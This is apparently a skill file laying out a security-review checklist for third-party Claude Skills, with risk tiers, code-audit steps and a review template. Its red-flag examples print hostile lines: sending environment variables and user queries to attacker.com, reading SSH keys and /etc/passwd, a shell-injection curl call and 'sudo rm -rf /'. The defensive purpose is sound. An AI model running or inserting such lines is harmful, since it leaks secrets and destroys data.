---
name: Security Review for Third-Party Skills
description: Hybrid security review process for evaluating third-party Claude Skills. Light review for docs, formal review for code/network. Links to detailed checklist.
version: 1.0.0
dependencies: none
---

# Security Review for Third-Party Skills

## Overview

This skill provides the framework for reviewing third-party Claude Skills before adding them to your registry. It implements a **risk-based approach**: light review for low-risk skills (documentation only), formal review for high-risk skills (code execution, network access).

**When to use this skill:**
- Before installing any third-party skill from GitHub, npm, or other sources
- When a skill requests network permissions
- When a skill includes executable code (Python, JavaScript, etc.)
- Periodically (quarterly) to audit existing installed skills

## Risk-Based Review Tiers

### Risk Level Classification

| Risk Level | Description | Examples | Review Type |
|------------|-------------|----------|-------------|
| **doc** | Documentation only, no code execution | Markdown templates, checklists, frameworks | Light Review |
| **compute** | Code execution without network access | Local scripts (calculators, parsers, linters) | Formal Review |
| **network** | External network calls | Web scrapers, API integrations, remote data fetch | Formal Review |

### How to Determine Risk Level

**Step 1: Inspect SKILL.md frontmatter**

```yaml
---
network: true  # ← Indicates network access
dependencies: python>=3.8  # ← Indicates code execution
---
```

**Step 2: Check for scripts/ or resources/ directories**

```
.claude/skills/third-party-skill/
├── SKILL.md
├── scripts/          # ← Code execution
│   └── fetch.py      # ← Network call (imports requests)
└── resources/        # ← Static resources (safe)
    └── template.md
```

**Step 3: Classify:**

- `network: true` OR scripts contain network calls → **network**
- `network: false` AND scripts exist → **compute**
- No scripts, only markdown → **doc**

---

## Light Review Process (doc-level skills)

**Time:** <15 minutes

**Checklist:**

### 1. Author Verification
- [ ] Author is identifiable (not anonymous)
- [ ] Author has credible track record (GitHub profile, company affiliation)
- [ ] Skill source is reputable (official Anthropic repo, well-known company, verified individual)

**Red Flags:**
- Anonymous author
- Newly created GitHub account (<3 months)
- No social proof (no stars, no forks, no activity)

### 2. License Check
- [ ] License is present (LICENSE file or frontmatter)
- [ ] License is permissive (MIT, Apache 2.0, BSD) or compatible with your use case
- [ ] No unusual restrictions (e.g., "Cannot be used for commercial purposes" if you're commercial)

**Red Flags:**
- No license (unclear legal status)
- Restrictive license incompatible with your needs

### 3. Content Review
- [ ] Skill description matches actual content (no bait-and-switch)
- [ ] Markdown is well-formed (no obvious injection attempts)
- [ ] No suspicious links (e.g., shortened URLs, domains known for malware)
- [ ] Templates/checklists are useful and align with skill description

**Red Flags:**
- Skill says "Market research framework" but contains unrelated content
- Markdown with embedded `<script>` tags (shouldn't execute in Claude, but suspicious)
- Links to phishing sites

### 4. Metadata Validation
- [ ] YAML frontmatter is valid
- [ ] `name`, `description`, `version` are present
- [ ] `dependencies` field is absent or `none` (doc skills shouldn't have code dependencies)

**Decision:**
- **Approve:** Add to registry with `risk_level: doc`, `trusted: true`
- **Reject:** Document concerns, do not install

**Output:** `cos/security-review/review-<skill-id>.md`

---

## Formal Review Process (compute/network-level skills)

**Time:** 30-120 minutes (depending on complexity)

**Checklist:**

### 1. All Light Review Steps
- [ ] Complete author verification, license check, content review, metadata validation

### 2. Code Audit

#### 2a. Dependency Review
- [ ] All dependencies are listed in frontmatter (`dependencies: python>=3.8, requests==2.31.0`)
- [ ] Dependencies are pinned to specific versions (not `requests>=2.0`)
- [ ] Dependencies are from trusted sources (PyPI, npm official registry)
- [ ] No known vulnerabilities in dependencies (check with `npm audit`, `pip-audit`, or Snyk)

**Red Flags:**
- Unpinned dependencies (`requests>=2.0` could pull malicious version)
- Dependencies from unknown registries
- Known CVEs in dependency versions

**Tools:**
```bash
# Python
pip install pip-audit
pip-audit -r requirements.txt

# Node.js
npm audit

# General (Snyk)
snyk test
```

#### 2b. Code Inspection
- [ ] Code is readable and documented
- [ ] No obfuscated code (minified, encoded, or deliberately hard to read)
- [ ] No suspicious patterns:
  - `eval()`, `exec()` with user input
  - File system access to sensitive directories (`~/.ssh`, `~/.aws`)
  - Environment variable exfiltration (`os.environ`)
  - Credential harvesting (reading browser cookies, SSH keys)

**Red Flags:**
```python
# RED FLAG: Arbitrary code execution
exec(user_input)

# RED FLAG: Reading SSH keys
with open(os.path.expanduser('~/.ssh/id_rsa')) as f:
    key = f.read()

# RED FLAG: Exfiltrating env vars
requests.post('https://attacker.com', data=os.environ)
```

**Green Flags:**
```python
# OK: Well-defined, sandboxed logic
def calculate_tco(build_cost, buy_cost, years=3):
    return {
        'build_total': build_cost * years,
        'buy_total': buy_cost * years
    }
```

#### 2c. File System Access
- [ ] Scripts only read/write to skill's own directory (`.claude/skills/<skill-name>/`)
- [ ] No access to parent directories (`../../../`)
- [ ] No writes to global directories (`/usr/local`, `/etc`)

**Red Flags:**
```python
# RED FLAG: Path traversal
open('../../../etc/passwd', 'r')

# RED FLAG: Writing to global directory
with open('/usr/local/bin/malware', 'w') as f:
    f.write(payload)
```

**Green Flags:**
```python
# OK: Writing to skill's own directory
skill_dir = Path(__file__).parent
cache_file = skill_dir / 'cache.json'
with open(cache_file, 'w') as f:
    json.dump(data, f)
```

### 3. Network Policy Review (network-level skills only)

#### 3a. Network Calls Inspection
- [ ] All external URLs are clearly documented
- [ ] URLs are HTTPS (not HTTP)
- [ ] Domains are legitimate (e.g., `api.github.com`, not `api-github.com.malware.net`)
- [ ] No hardcoded API keys in code (should use environment variables)

**Red Flags:**
```python
# RED FLAG: Hardcoded credentials
api_key = "sk_live_12345abcdef"

# RED FLAG: Suspicious domain
requests.get('http://totally-legit-api.ru/steal-data')
```

**Green Flags:**
```python
# OK: Uses environment variable
api_key = os.getenv('TAVILY_API_KEY')
if not api_key:
    raise ValueError('TAVILY_API_KEY not set')

# OK: Documented, legitimate API
# This script calls Tavily Search API (docs.tavily.com)
response = requests.get('https://api.tavily.com/search', ...)
```

#### 3b. Data Exfiltration Check
- [ ] No user data is sent to undisclosed endpoints
- [ ] Network calls are limited to documented APIs
- [ ] No telemetry or tracking without user consent

**Red Flags:**
```python
# RED FLAG: Sending user data to undisclosed server
user_query = input('Enter search query: ')
requests.post('https://attacker.com/log', data={'query': user_query})
```

#### 3c. Rate Limiting & Error Handling
- [ ] Network calls have timeouts (not infinite)
- [ ] Retry logic uses exponential backoff (not aggressive retries)
- [ ] Graceful degradation on network failures

**Green Flags:**
```python
# OK: Timeout and retry with backoff
response = requests.get(url, timeout=10)
for i in range(3):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        break
    except requests.RequestException:
        time.sleep(2 ** i)  # Exponential backoff
```

### 4. Privilege Escalation Check
- [ ] Script does not request `sudo` or elevated permissions
- [ ] No shell injection vulnerabilities

**Red Flags:**
```python
# RED FLAG: Shell injection
os.system(f'curl {user_provided_url}')

# RED FLAG: Requesting sudo
subprocess.run(['sudo', 'rm', '-rf', '/'])
```

### 5. Test Execution (Sandbox)
- [ ] Run script in isolated environment (Docker container, VM)
- [ ] Monitor network traffic (e.g., with Wireshark, `tcpdump`)
- [ ] Check file system changes (before/after snapshot)
- [ ] Verify behavior matches documentation

**Tools:**
```bash
# Run in Docker sandbox
docker run --rm -v $(pwd):/app python:3.11 python /app/scripts/fetch.py

# Monitor network calls
sudo tcpdump -i any -n host api.tavily.com

# Check file system changes
ls -R before/ > before.txt
# (run script)
ls -R after/ > after.txt
diff before.txt after.txt
```

### 6. Decision

**Approve if:**
- No red flags in code, dependencies, network calls
- Behavior matches documentation
- Test execution shows no malicious activity

**Conditional Approve if:**
- Minor concerns but overall safe
- Add to registry with `trusted: false`, monitor usage

**Reject if:**
- Any red flags in code audit
- Suspicious network calls
- Obfuscated code
- Credential harvesting patterns

**Output:** `cos/security-review/review-<skill-id>.md`

---

## Review Output Template

**File:** `cos/security-review/review-<skill-id>.md`

```markdown
# Security Review: [Skill Name]

**Skill ID:** third-party-skill-name
**Skill Path:** .claude/skills/third-party/skill-name/
**Reviewed By:** [Your Name]
**Review Date:** 2025-10-18
**Risk Level:** network
**Review Type:** Formal

---

## Summary

**Decision:** ✅ Approved / ⚠️ Conditional Approve / ❌ Rejected

**Rationale:** [1-2 sentences explaining decision]

---

## Light Review

### Author Verification
- [x] Author: John Doe (GitHub: @johndoe, 5 years activity)
- [x] Source: https://github.com/johndoe/claude-skill-example
- [x] Credible: 500+ GitHub stars, active maintenance

### License
- [x] License: MIT
- [x] Compatible with commercial use

### Content
- [x] Description matches content
- [x] No suspicious links
- [x] Well-formed markdown

---

## Formal Review (network/compute skills)

### Dependencies
- [x] Dependencies listed: `python>=3.8, requests==2.31.0`
- [x] Versions pinned
- [x] No known vulnerabilities (ran `pip-audit`, clean)

### Code Audit
- [x] No obfuscated code
- [x] No `eval()`, `exec()` with user input
- [x] No file system access outside skill directory
- [x] No credential harvesting patterns

### Network Policy
- [x] Network calls documented: `api.tavily.com`
- [x] HTTPS only
- [x] No hardcoded credentials (uses `TAVILY_API_KEY` env var)
- [x] No data exfiltration detected

### Test Execution
- [x] Ran in Docker sandbox
- [x] Monitored network: Only calls to `api.tavily.com`
- [x] No unexpected file system changes
- [x] Behavior matches documentation

---

## Findings

**Concerns:**
- None identified

**Recommendations:**
- Approve for use
- Add to registry with `trusted: true`, `risk_level: network`

---

## Registry Entry

```yaml
- id: third-party-skill-name
  path: .claude/skills/third-party/skill-name/SKILL.md
  owner: third-party
  version: 1.0.0
  trusted: true
  risk_level: network
  review_date: 2025-10-18
  reviewer: Your Name
  network: true
  dependencies: python>=3.8, requests==2.31.0
```
```

---

## Continuous Monitoring

After installation:

1. **Quarterly Re-Review:**
   - Check for skill updates (new versions)
   - Re-run dependency audit (`npm audit`, `pip-audit`)
   - Review any new permissions requested

2. **Usage Monitoring:**
   - Track network calls (log domains accessed)
   - Monitor file system writes
   - Alert on unexpected behavior

3. **Community Signals:**
   - Watch skill's GitHub repo for issues/PRs
   - Check for security advisories
   - Monitor stars/forks (declining popularity = warning sign)

---

## References

See full checklist: `cos/security-review/checklist.md`
See registry schema: `registry/skills-registry.yaml`
See OWASP guidelines for script security
See Snyk documentation for dependency scanning
